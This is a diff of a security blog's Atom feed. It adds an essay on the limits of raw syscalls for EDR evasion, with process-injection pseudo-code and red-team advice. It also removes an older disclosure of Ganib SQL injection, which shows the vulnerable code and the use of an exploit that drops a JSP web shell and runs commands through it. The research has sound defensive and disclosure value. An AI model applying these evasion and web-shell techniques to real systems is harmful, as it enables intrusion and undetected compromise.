@@ -4,7 +4,7 @@
   <title><![CDATA[]]></title>
   <link href="http://hatRiot.github.io/atom.xml" rel="self"/>
   <link href="http://hatRiot.github.io/"/>
-  <updated>2021-03-10T00:51:31-08:00</updated>
+  <updated>2021-05-12T11:29:21-07:00</updated>
   <id>http://hatRiot.github.io/</id>
   <author>
     <name><![CDATA[Bryan Alexander]]></name>
@@ -12,6 +12,163 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[the fanciful allure and utility of syscalls]]></title>
+    <link href="http://hatRiot.github.io/blog/2021/05/12/on-the-fanciful-allure-of-raw-syscalls/"/>
+    <updated>2021-05-12T14:10:04-07:00</updated>
+    <id>http://hatRiot.github.io/blog/2021/05/12/on-the-fanciful-allure-of-raw-syscalls</id>
+    <content type="html"><![CDATA[<p>So over the years I&rsquo;ve had a number of conversations about the utility of using syscalls in shellcode, C2s, or loaders in offsec tooling and red team ops. For reasons likely related to the increasing maturity of EDRs and their totalitarian grip in enterprise environments, I&rsquo;ve seen an uptick in projects and blogs championing &ldquo;raw syscalls&rdquo; as a technique for evading AV/SIEM technologies. This post is an attempt to describe why I think the technique&rsquo;s efficacy has been overstated and its utility stretched thin.</p>
+
+<p>This diatribe is not meant to denigrate any one project or its utility; if your tool or payload uses syscalls instead of ntdll, great. The technique is useful under certain circumstances and can be valuable in attempts at evading EDR, particularly when combined with other strategies. What it&rsquo;s not, however, is a silver bullet. It is not going to grant you any particularly interesting capability by virtue of evading a vendor data sink. Determining its efficacy in context of the execution chain is difficult, ambiguous at best. Your C2 is not advanced in EDR evasion by including a few ntdll stubs.</p>
+
+<p>Note that when I&rsquo;m talking about EDRs, I&rsquo;m speaking specifically to modern samples with online and cloud-based machine learning capabilities, both attended and unattended. Crowdstrike Falcon, Cylance, CybeReason, Endgame, Carbon Black, and others have a wide array of ML strategies of varying quality. This post is not an analysis of these vendors&#8217; user mode hooking capabilities.</p>
+
+<p>Finally, this discussion&rsquo;s perspective is that of post-exploitation, necessary for an attacker to issue a syscall anyway. User mode hooks can provide useful telemetry on user behavior prior to code execution (phishing stages), but once that&rsquo;s achieved, all bets of process integrity are off.</p>
+
+<h2>syscalling</h2>
+
+<p>Very briefly, using raw syscalls is an old technique that obviates the need to use sanctioned APIs and instead uses assembly to execute certain functions exposed to user mode from the kernel. For example, if you wanted to read memory of another process, you might use <code>NtReadVirtualMemory</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>NtReadVirtualMemory(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToRead, NumberOfBytesReaded);</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This function is exported by NTDLL; at runtime, the PE loader loads every DLL in its import directory table, then resolves all of the import address table (IAT) function pointers. When we call <code>NtReadVirtualMemory</code> our pointers are fixed up based on the resolved address of the function, bringing us to execute:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>00007ffb`1676d4f0 4c8bd1           mov     r10, rcx
+</span><span class='line'>00007ffb`1676d4f3 b83f000000       mov     eax, 3Fh
+</span><span class='line'>00007ffb`1676d4f8 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)], 1
+</span><span class='line'>00007ffb`1676d500 7503             jne     ntdll!NtReadVirtualMemory+0x15 (00007ffb`1676d505)
+</span><span class='line'>00007ffb`1676d502 0f05             syscall 
+</span><span class='line'>00007ffb`1676d504 c3               ret     
+</span><span class='line'>00007ffb`1676d505 cd2e             int     2Eh
+</span><span class='line'>00007ffb`1676d507 c3               ret </span></code></pre></td></tr></table></div></figure>
+
+
+<p>This stub, implemented in NTDLL, moves the syscall number (0x3f) into EAX and uses <code>syscall</code> or <code>int 2e</code>, depending on the system bitness, to transition to the kernel. At this point the kernel begins executing the routine tied to code <code>0x3f</code>. There are plenty of resources on how the process works and what happens on the way back, so <a href="https://www.geoffchappell.com/studies/windows/km/cpu/sep.htm">please</a> <a href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/glimpse-into-ssdt-in-windows-x64-kernel">refer</a> <a href="https://scorpiosoftware.net/2019/11/">elsewhere</a>.</p>
+
+<p>Modern EDRs will typically inject hooks, or detours, into the implementation of the function. This allows them to capture additional information about the context of the call for further analysis. In some cases the call can be outright blocked. As a red team, we obviously want to stymie this.</p>
+
+<p>With that, I want to detail a few shortcomings with this technique that I&rsquo;ve seen in many of the public implementations. Let me once again stress here that I&rsquo;m not trying to denigrate these tools; they provide utility and have their use cases that cannot be ignored, which I hope to highlight below.</p>
+
+<h3>syscall values are not consistent</h3>
+
+<p>j00ru maintains the go-to source for both <a href="https://j00ru.vexillium.org/syscalls/nt/64/">nt</a> and <a href="https://j00ru.vexillium.org/syscalls/win32k/64/">win32k</a>, and by blindly searching around on here you can see the shift in values between functions. Windows 10 alone currently has <em>eleven</em> columns for the different major builds of Win10, some functions shifting 4 or 5 times. This means that we either need to know ahead of time what build the victim is running and tailor the syscall stubs specifically (at worst cumbersome in a post-exp environment), or we need to dynamically generate the syscall number at runtime.</p>
+
+<p>There are several proposed solutions to discovering the syscall at runtime: sorting Zw exports, reading the stubs directly out of the mapped NTDLL, querying j00ru&rsquo;s <a href="https://github.com/j00ru/windows-syscalls">Github repository</a> (lol), or actually baking every potential code into the payload and selecting the correct one at runtime. These are all usable options, but everything here is either cumbersome or an unnecessary risk in raising our threat profile with the EDRs ML model.</p>
+
+<p>Let&rsquo;s say you attempt to read NTDLL off disk to discover the stubs; that requires issuing <code>CreateFile</code> and <code>ReadFile</code> calls, both triggering minifilter and ETW events, and potentially executing already established EDR hooks. Maybe that raises your threat profile a few percentage points, but you&rsquo;re still golden. You then need to copy that stub out into an executable section, setup the stack/registers, and invoke. Optionally, you could use the already mapped NTDLL; that requires either <code>GetProcAddress</code>, walking PEB, or parsing out the IAT. Are these events surrounding the resolution of the stub more or less likely to increase the threat profile than just calling the NTDLL function itself?</p>
+
+<p>The least-bad option of these is baking the codes into your payload and switching at runtime based on the detection of the system version. In memory this is going to look like an s-box switch, but there are no extraneous calls to in-memory or on-disk files or stumbles up or down the PEB. This is great, but cumbersome if you need to support a range of languages and execution environments, particularly those with on-demand or dynamic requirements.</p>
+
+<h3>syscall&rsquo;s miss useful/critical functionality</h3>
+
+<p>In addition to ease of use in C/C++, user mode APIs provide additional functionality prior to hitting the kernel. This could be setting up/formatting arguments, exception or edge-case handling, SxS/activation contexts, etc. Without using these APIs and instead syscalling yourself, you&rsquo;re missing out on this, for better or for worse. In some cases it means porting that behavior directly to your assembler stub or setting up the environment pre/post execution.</p>
+
+<p>In some cases, like <a href="http://theevilbit.blogspot.com/2018/08/about-writeprocessmemory.html"><code>WriteProcessMemory</code></a> or <code>CreateRemoteThreadEx</code>, it&rsquo;s more &ldquo;helpful&rdquo; than actually necessary. In others, like <code>CreateEnclave</code> or <code>CallEnclave</code>, it&rsquo;s virtually a requirement. If you&rsquo;re angling to use only a specific set of functions (<code>NtReadVirtualMemory/NtWriteVirtualMemory/etc</code>) this might not be much of an issue, but expanding beyond that comes with great caveat.</p>
+
+<h3>the spooky functions are probably being called anyway</h3>
+
+<p>In general, syscalling is used to evade the use of some function known or suspected to be hooked in user mode. In certain scenarios we can guarantee that the syscall is the only way that hooked function is going to execute. In others, however, such as a more feature rich stage 0 or C2, we can&rsquo;t guarantee this. Consider the following (pseudo-code):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>UseSysCall(NtOpenProcess, ...)
+</span><span class='line'>UseSysCall(NtAllocateVirtualMemory, ...)
+</span><span class='line'>UseSysCall(NtWriteVirtualMemory, ...)
+</span><span class='line'>UseSysCall(NtCreateThreadEx, ...)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In the above we&rsquo;ve opened a writable process handle, created a blob of memory, written into it, and started a thread to execute it. A very common process injection strategy. Setting aside the tsunami of information this feeds into the kernel, only dynamic instrumentation of the runtime would detect something like this. Any IAT or inline hooks are evaded.</p>
+
+<p>But say your loader does a few other things, makes a few other calls to user32, dnsapi, kernel32, etc. Do you know that those functions don&rsquo;t make calls into the very functions you&rsquo;re attempting to avoid using? Now you could argue that by evading the hooks for more sensitive functionality (process injection), you&rsquo;ve lowered your threat score with the EDR. This isn&rsquo;t entirely true though because EDR isn&rsquo;t blind to your remote thread (<code>PsSetCreateThreadNotifyRoutine</code>) or your writable process handle (<code>ObRegisterCallbacks</code>) or even your cross process memory write. So what you&rsquo;ve really done is avoided sending contextualized telemetry to the kernel of the cross process injection &mdash; is that enough to avoid heightened scrutiny? Maybe.</p>
+
+<p>Additionally, modern EDRs hook a ton of stuff (or at least some do). Most syscall projects and research focus on NTDLL; what about kernel32, user32, advapi32, wininet, etc? None of the syscall evasion is going to work here because, naturally, a majority of those don&rsquo;t need to syscall into the kernel (or do via other ntdll functions&hellip;). For evasion coverage, then, you may need to both bolt on raw syscall support as well as a generic unhooking strategy for the other modules.</p>
+
+<h3>syscall&rsquo;s are partially effective at escaping UM data sinks</h3>
+
+<p>Many user mode hooks themselves do not have proactive defense capabilities baked in. By and large they are used to gather telemetry on the call context to provide to the kernel driver or system service for additional analysis. This analysis, paired with what it&rsquo;s gathered via ETW, kernel mode hooks, and other data sinks, forms a composite picture of the process since birth.</p>
+
+<p>Let&rsquo;s take the example of cross process code injection referenced above. Let&rsquo;s also give your loader the benefit of the doubt and assume it&rsquo;s triggered nothing and emitted little telemetry on its way to execution. When the following is run:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>UseSysCall(NtOpenProcess, ...)
+</span><span class='line'>UseSysCall(NtAllocateVirtualMemory, ...)
+</span><span class='line'>UseSysCall(NtWriteVirtualMemory, ...)
+</span><span class='line'>UseSysCall(NtCreateThreadEx, ...)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We are firing off a <em>ton</em> of telemetry to the kernel and any listening drivers. Without a single user mode hook we would know:</p>
+
+<ol>
+<li>Process A opened a handle to Process B with X permissions (<code>ObRegisterCallbacks</code>)</li>
+<li>Process A allocated memory in Process B with X permissions (<code>EtwTi</code>)</li>
+<li>Process A wrote data into Process B VAS (<code>EtwTi</code>)</li>
+<li>Process A created a remote thread in Process B (<code>PsSetCreateThreadNotifyRoutine</code>, <code>Etw</code>)</li>
+</ol>
+
+
+<p>It is true that <code>EtwTi</code> is newish and doesn&rsquo;t capture everything, hence the partial effectiveness. But that argument grows thin overtime as adoption of the feed grows and the API matures.</p>
+
+<p>A strong argument for syscalls here is that it evades custom data sinks. Up until now we&rsquo;ve only considered what Microsoft provides, not what the vendor themselves might include in their hook routine, and how that telemetry might influence their agent&rsquo;s model. Some vendors, for performance reasons, prefer to extract thread information at call time. Some capture all parameters and pack them into more consumable binary blobs for consumption in the kernel. Depending on what exactly the hook does, and its criticality to the bayesian model, this might be a great reason to use them.</p>
+
+<h3>your testing isn&rsquo;t comprehensive or indicative of the general case</h3>
+
+<p>This is a more general gripe with some of the conversation on modern EDR evasion. Modern EDRs use a variety of learning heuristics to determine if an unknown binary is malicious or not; sometimes successfully, sometimes not. This model is initially trained on some set of data (depending on the vendor), but continues to grow based on its observations of the environment and data shared amongst nodes. This is generally known as online learning. On large deploys of new EDRs there is typically a learning or passive phase; that allows the model to collect baseline metrics of what is normal and, hopefully, identify anomalies or deviations thereafter.</p>
+
+<p>Effectively then, given a long enough timeline, one enterprise&rsquo;s agent model might be <em>significantly</em> different from another. This has a few implications. The first being, of course, that your lab environment is not an accurate representation of the client. While your syscall stub might work fine in the lab, unless it&rsquo;s particularly novel, it&rsquo;s entirely possible it&rsquo;s been observed elsewhere.</p>
+
+<p>This also means that pinpointing the reason why your payload works or doesn&rsquo;t work is a bit of dark art. If your payload with the syscall evasion ends up working in a client environment, does that mean the evasion is successful, or would it have worked regardless of whether you used ntdll or not? If on the other hand your payload was blocked, can you identify the syscalls as the problem? Furthermore, if you add in evasion stubs and successfully execute, can we definitively point to the syscall evasion as the threat score culprit?</p>
+
+<p>At this point, then, it&rsquo;s a game of risk. You risk allowing the agent&rsquo;s model to continue aggregating telemetry and improving its heuristic, and thereby the entire network&rsquo;s model. Repeated testing taints the analysis chain as it grows to identify portions of your code as malicious or not; a fuzzy match, regardless of the function or assembler changes made. You also risk exposing the increased telemetry and details to the cloud which is then in the hands of both automated and manual tooling and analysis. If you disabled this portion, then, you also lack an accurate representation of detection capabilities.</p>
+
+<p>In short, much of the testing we do against these new EDR solutions is rather unscientific. That&rsquo;s largely a result of our inability to both peer into the state of an agent&rsquo;s model while also deterministically assessing its capabilities. Testing in a limped state (ie. offline, with cloud connectivity blackholed, etc.) and restarting VMs after every test provides some basic insight but we lose a significant chunk of EDR capability. Isolation is difficult.</p>
+
+<h2>anyway</h2>
+
+<p>These things, when taken together, motivate my reluctance to embrace the strategy in much of my tooling. I&rsquo;ve found scant cases in which a raw syscall was preferable to some other technique and I&rsquo;ve become <em>exhausted</em> by the veracity of some tooling claims. The EDRs today are not the EDRs of our red teaming forefathers; testing is complicated, telemetry insight is improving, and data sets and enterprise security budgets are growing. We&rsquo;ve got to get better at quantifying and substantiating our tool testing/analysis, and we need to improve the conversation surrounding the technologies.</p>
+
+<p>I have a few brief, unsolicited thoughts for both red teams and EDR vendors based on my years of experience in this space. I&rsquo;d love to hear others.</p>
+
+<h3>for EDR</h3>
+
+<p>Do not rely on user mode hooks and, more importantly, do not implicitly <em>trust</em> it. Seriously. Even if you&rsquo;re monitoring hook integrity from the kernel, there are too many variables and too many opportunities for malicious code to tamper with or otherwise corrupt the hook or the integrity of the incoming data. Consider this from a performance perspective if you need to. I know you think you&rsquo;re being cute by:</p>
+
+<ol>
+<li>Monitoring your hot patches for modification</li>
+<li>Encrypting telemetry</li>
+<li>Transmitting telemetry via clandestine/obscure methods (I see you <code>NtQuerySystemInformation</code>)</li>
+<li>&ldquo;Validating&rdquo; client processes</li>
+</ol>
+
+
+<p>The fact is anything emitted from an unsigned, untrusted, user mode process can be corrupted. Put your efforts into consuming ETW and registering callbacks on all important routines, PPL&#8217;ing your user mode services, and locking down your IPC and general communication channels. Consume AMSI if you must, with the same caveat as user mode hooks: it is a data sink, and not necessarily one of truth.</p>
+
+<p>The more you can consume in the kernel (maybe a trustlet some day?), the more difficult you are to tamper with. There is of course the ability for red team to wormhole into the kernel and attack your driver, but this is another hurdle for an attacker to leap, and yet another opportunity to catch them.</p>
+
+<h3>for red team</h3>
+
+<p>Using raw syscalls is but a small component of a greater system &mdash; evasion is less a set of techniques and more a system of behaviors. Consider that the <em>hooks</em> themselves are not the problem, but rather what the hooks do. I had to edit myself several times here to not reference the spoon quote from the Matrix, but it&rsquo;s apt, if cliche.</p>
+
+<p>There are also more effective methods of evading user mode hooks than raw syscalling. I&rsquo;ve discussed some of them publicly <a href="https://twitter.com/dronesec/status/1355587781825683457">in the past</a>, but urge you to investigate the machinations of the EDR hooks themselves. I&rsquo;d argue even IAT/inline unhooking is more effective, in some cases.</p>
+
+<p>Cloud capabilities are the truly scary expansion. Sample submission, cloud telemetry aggregation and analysis, and manual/automatic hunting services change the landscape of threat analysis. Not only can your telemetry be correlated or bolstered amongst nodes, it can be retroactively hunted and analyzed. This retroactive capability, often provided by backend automation or threat hunting teams (hi Overwatch!) can be quite effective at improving an enterprises agent models. And not only one enterprises model; consider the fact that these data points are shared amongst <em>all</em> vendor subscribers, used to subsequently improve those agent models. Burning a technique is no longer isolated to a technology or a client.</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[On Exploiting CVE-2021-1648 (splwow64 LPE)]]></title>
@@ -7148,435 +7305,6 @@ Their analytics status/server monitoring application is vulnerable to a fairly t
     <content type="html"><![CDATA[<p>This isn&rsquo;t a real introduction post, just a note that I&rsquo;m migrating from Google Blogger to Github Pages with Octopress.  So far it&rsquo;s great.  I&rsquo;m going to be slowly migrating all posts over from Blogger into here, though I may skip a few early posts that aren&rsquo;t as interesting.</p>
 
 <p>Hopefully it provides me with the functionality that I&rsquo;ve been looking for.</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[ganib project management 2.3 SQLi]]></title>
-    <link href="http://hatRiot.github.io/blog/2014/02/24/ganib-project-management-2.3-sqli/"/>
-    <updated>2014-02-24T21:03:07-08:00</updated>
-    <id>http://hatRiot.github.io/blog/2014/02/24/ganib-project-management-2.3-sqli</id>
-    <content type="html"><![CDATA[<p><a href="http://www.ganib.com/">Ganib</a> is a project management tool supporting all the glorious project management utilities.  The latest version, 2.3 and below, is vulnerable to multiple SQL injection vectors.</p>
-
-<p>The first SQL injection vector is a post-auth UPDATE injection in changetheme.jsp:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>String theme = request.getParameter("theme");
-</span><span class='line'>User user = (User) pageContext.getAttribute("user", PageContext.SESSION_SCOPE);
-</span><span class='line'>if( user != null && user.getID() != null ) {
-</span><span class='line'>    DBBean db = new DBBean();
-</span><span class='line'>    
-</span><span class='line'>    try {
-</span><span class='line'>        String query = "UPDATE PN_PERSON SET THEME_ID = '" + theme + "' WHERE PERSON_ID = " + user.getID();
-</span><span class='line'>        db.prepareStatement(query);
-</span><span class='line'>        db.executePrepared();
-</span><span class='line'>    } finally {
-</span><span class='line'>        db.release();
-</span><span class='line'>    }</span></code></pre></td></tr></table></div></figure>
-
-
-<p>It&rsquo;s obvious where the flaw is.</p>
-
-<p>The most serious of the vectors is a preauth SQL injection vulnerability in the login POST request.  The issue with this is that user-controlled data is passed through a series of data objects, all of which fail to sanitize the data, but all of which assume the data is cleansed.</p>
-
-<p>The initial POST request is sent to <code>LoginProcess.jsp</code>.  This builds the LogManager object, which instantiates the object with our provided username, password, and user domain; all unsanitized:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>// Grab parameters from Login form
-</span><span class='line'>String secure = request.getParameter ("secure");
-</span><span class='line'>String username = request.getParameter ("J_USERNAME");
-</span><span class='line'>username = username == null ? u_name : username;
-</span><span class='line'>String password = request.getParameter ("J_PASSWORD");
-</span><span class='line'>password = password == null ? pwd : password;
-</span><span class='line'>String userDomain = request.getParameter("userDomain");
-</span><span class='line'>
-</span><span class='line'>[...]
-</span><span class='line'>
-</span><span class='line'>else 
-</span><span class='line'>    loginManager.createLoginContext(username, password, userDomain);</span></code></pre></td></tr></table></div></figure>
-
-
-<p>And the request, for reference:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>POST /LoginProcessing.jsp HTTP/1.1
-</span><span class='line'>Host: 192.168.1.219:8080
-</span><span class='line'>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0
-</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-</span><span class='line'>Accept-Language: en-US,en;q=0.5
-</span><span class='line'>Accept-Encoding: gzip, deflate
-</span><span class='line'>Referer: http://192.168.1.219:8080/
-</span><span class='line'>Cookie: JSESSIONID=747813A1BB393D97FD577E2010F25F37; g.s=CE7D2D0E1293623B73B56FC239BFA23D; g.r=1; _sid=; _styp=; JSPRootURL=; cookies=true
-</span><span class='line'>Connection: keep-alive
-</span><span class='line'>Content-Type: application/x-www-form-urlencoded
-</span><span class='line'>Content-Length: 109
-</span><span class='line'>
-</span><span class='line'>theAction=submit&J_USERNAME=bob%40bob.com&J_PASSWORD=password&language=en&remember_checkbox=on&userDomain=1000</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Once the loginManager is instantiated, <code>loginManager.completeLogin</code> is called.  This instantiates the <code>DomainAuthenticator</code> object and attempts to login:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>try
-</span><span class='line'>{
-</span><span class='line'>    domainAuthenticator = DomainAuthenticator.getInstance(this.loginContext.getDomainID(), this.loginContext.getUsername(), this.loginContext.getClearTextPassword());
-</span><span class='line'>    domainAuthenticator.authenticate(shadowLogin, isFromSSOLogin);
-</span><span class='line'>    statusCode = LoginStatusCode.SUCCESS;
-</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The <code>DomainAuthenticator</code> object manages authentication with the various supported methods; domain, SSO, etc.  If you&rsquo;re still following with me, the traversal path thus far can be visualized below:</p>
-
-<p><img class="center" src="http://2.bp.blogspot.com/-ohiBWXtvQso/Uu6nxy-RQ-I/AAAAAAAAAzQ/9vL6HGqG4Ks/s1600/flow.jpg"></p>
-
-<p>Note that, so far, none of the provided input has yet to be sanitized.</p>
-
-<p>The <code>DomainAuthenticator</code> constructor first instantiates a <code>UserDomain</code> object:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>private DomainAuthenticator(String domainID, String username, String clearTextPassword)
-</span><span class='line'>  throws DomainException
-</span><span class='line'>{
-</span><span class='line'>  try
-</span><span class='line'>  {
-</span><span class='line'>    UserDomain domain = new UserDomain();
-</span><span class='line'>    domain.setID(domainID);
-</span><span class='line'>    domain.load();
-</span><span class='line'>    setDomain(domain);
-</span><span class='line'>
-</span><span class='line'>    setAuthenticationContext(new AuthenticationContext(domainID, username, clearTextPassword));
-</span><span class='line'>  }</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Once the <code>UserDomain</code> object is initialized, the <code>domainID</code> is set by our unsanitized <code>userDomain</code> parameter, and the load function is invoked.  The <code>load</code> function is as follows:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'> public void load()
-</span><span class='line'>    throws PersistenceException
-</span><span class='line'>  {
-</span><span class='line'>    DBBean db = new DBBean();
-</span><span class='line'>    try
-</span><span class='line'>    {
-</span><span class='line'>      load(db);
-</span><span class='line'>    } finally {
-</span><span class='line'>      db.release();
-</span><span class='line'>    }
-</span><span class='line'>  }
-</span><span class='line'>
-</span><span class='line'>  public void load(DBBean db)
-</span><span class='line'>    throws PersistenceException
-</span><span class='line'>  {
-</span><span class='line'>    loadProperties(db);
-</span><span class='line'>
-</span><span class='line'>    loadUsers(db);
-</span><span class='line'>
-</span><span class='line'>    loadSupportedConfigurations(db);
-</span><span class='line'>  }</span></code></pre></td></tr></table></div></figure>
-
-
-<p>A <code>DBBean</code> object is created, and passed into an overloaded <code>load</code> function.  This runs three other functions to build the <code>DBBean</code> object; the call we&rsquo;re interested in is <code>loadUsers</code>:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'> public void loadUsers(DBBean db)
-</span><span class='line'>    throws PersistenceException
-</span><span class='line'>  {
-</span><span class='line'>    if (this.domainID == null) {
-</span><span class='line'>      throw new PersistenceException("UserDomain.loadUsers() can not proceed because the domainID is null");
-</span><span class='line'>    }
-</span><span class='line'>
-</span><span class='line'>    if (this.userCollection == null) {
-</span><span class='line'>      this.userCollection = new DomainUserCollection();
-</span><span class='line'>    }
-</span><span class='line'>
-</span><span class='line'>    this.userCollection.setDomainID(getID());
-</span><span class='line'>    this.userCollection.load(db);
-</span><span class='line'>  }</span></code></pre></td></tr></table></div></figure>
-
-
-<p>This call invokes yet another object, <code>DomainUserCollection</code>.  Once instantiated, our yet to be sanitized <code>userDomain</code> parameter is set in the object, and the <code>load</code> function is invoked.  This function, finally, takes us to our vulnerable SQL query:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'> protected void load(DBBean dbean)
-</span><span class='line'>    throws PersistenceException
-</span><span class='line'>  {
-</span><span class='line'>    String qstrLoadUsersForDomain = "SELECT U.USER_ID, U.USERNAME, U.DISPLAY_NAME,U.USER_STATUS FROM PN_USER_VIEW U WHERE DOMAIN_ID = " + getDomainID();
-</span><span class='line'>
-</span><span class='line'>    if (this.domainID == null) {
-</span><span class='line'>      throw new PersistenceException("DomainUserCollection.load() was unable to load the users for this domain because of an invalid (null) domainID");
-</span><span class='line'>    }
-</span><span class='line'>
-</span><span class='line'>  [...]
-</span><span class='line'>
-</span><span class='line'>  dbean.executeQuery(qstrLoadUsersForDomain);</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Here we can see that our controlled <code>userDomain</code> parameter is injected directly into the SQL query.  This can be exploited using a UNION SELECT with four columns to write a JSP shell out.</p>
-
-<p>Because of the way the Tomcat applicaton&rsquo;s web.xml is configured, we cannot drop a JSP into the ROOT folder and expect it to run.  Have no fear, as the default Tomcat install built into Ganib includes both /manager and /host-manager, which provide perfect receptacles for our dumped shell:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@jali:~/exploits# python ganib_sqli.py -i 192.168.1.64 -p /var/www/ganib/tomcat/webapps/host-manager -j ./cmd.jsp
-</span><span class='line'>[!] Dropping ./cmd.jsp on 192.168.1.64...
-</span><span class='line'>[!] Dropped at /wjdll.jsp
-</span><span class='line'>root@jali:~/exploits# python -c 'import requests; print requests.get("http://192.168.1.64:8080/host-manager/wjdll.jsp?cmd=pwd").content'
-</span><span class='line'>
-</span><span class='line'>/var/www/ganib/tomcat/bin
-</span><span class='line'>
-</span><span class='line'>    1    2    3
-</span><span class='line'>
